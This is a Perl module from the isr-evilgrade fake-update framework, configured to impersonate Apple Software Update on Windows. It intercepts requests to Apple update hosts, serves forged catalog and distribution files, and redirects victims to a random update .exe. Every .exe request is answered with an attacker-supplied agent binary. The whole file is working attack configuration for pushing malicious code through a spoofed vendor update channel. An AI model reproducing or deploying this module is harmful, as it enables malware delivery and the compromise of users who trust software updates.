###############
# appleupdate.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::appleupdate;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'    => 'Apple Windows Update Software',
    'version' => '1.0',
    'appver' =>
        ' < 2.1.2 (<= Safari 5.0.2 7533.18.5, <= Itunes 10.0.1.22, <= Quicktime 7.6.8 1675)',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{},
    'vh' =>
        '(swcatalog.apple.com|swcdn.apple.com|itunes.com|swscan.apple.com)',
    'request' => [
        {   'req'    => '\.sucatalog$',    #regex friendly
            'type'   => 'file',            #file|string|agent|install
            'method' => '',                #any
            'bin'    => '',
            'string' => '',
            'parse'  => '1',
            'file' => './include/appleupdate/appleupdate_catalog.xml'
        },

        {   'req'    => '061-4339.Spanish.dist',    #regex friendly
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => '',
            'string' => '',
            'parse'  => '1',
            'file' => './include/appleupdate/061-4339.Spanish.dist'
        },

        #           {
        #           'req' => 'AppleSoftwareUpdate.exe', #regex friendly
        #           'type' => 'file', #file|string|agent|install
        #           'method' => '', #any
        #           'bin'    => '1',
        #           'string' => '',
        #           'parse' => '1',
        #           'file' => './include/appleupdate/SoftwareUpdate.exe'
        #           },
        #           {
        #           'req' => 'AppleSoftwareUpdate.dmg', #regex friendly
        #           'type' => 'file', #file|string|agent|install
        #           'method' => '', #any
        #           'bin'    => '1',
        #           'string' => '',
        #           'parse' => '1',
        #           'file' => './agent/osx/update.dmg'
        #           },

        {   'req'    => '.dist',    #regex friendly
            'type'   => 'file',     #file|string|agent|install
            'method' => '',         #any
            'bin'    => '',
            'string' => '',
            'parse'  => '1',
            'file' => './include/appleupdate/061-4339.Spanish.dist'
        },

        {   'req'     => '/closed.html',            #regex anything
            'type'    => 'string',                  #file|string|agent|install
            'method'  => '',                        #any
            'bin'     => '',
            'string'  => '',
            'parse'   => '1',
            'file'    => '',
            'cheader' => "HTTP/1.1 302 Found\r\n"
                . "Location: http://swcatalog.apple.com/update<%RND%>.exe \r\n"
                . "Content-Length: 0 \r\n"
                . "Connection: close \r\n\r\n",
        },

        {   'req'    => '.exe',                     #regex friendly
            'type'   => 'agent',                    #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file'   => ''
        },
    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'rnd' => {
            'val'     => 'isrcore::utils::RndNum(5)',
            'hidden'  => 1,
            'dynamic' => 1,
        },
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
